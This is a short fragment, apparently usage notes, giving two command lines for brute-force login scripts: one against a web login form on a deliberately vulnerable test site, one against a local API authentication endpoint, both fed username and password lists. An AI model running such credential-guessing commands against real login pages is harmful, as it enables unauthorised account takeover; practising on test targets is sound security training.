python bruteforce.py -U http://testphp.vulnweb.com/login.php -d "uname=^USER^&pass=^PASS^" -f "Invalid" -u usernames.txt -p passwords.txt

## API BRUTE FORCE

python bruteforce-api.py -U http://127.0.0.1:3001/api/authenticate -u uid -p password --userfile usernames.txt --passfile passwords.txt -lang pt -device android
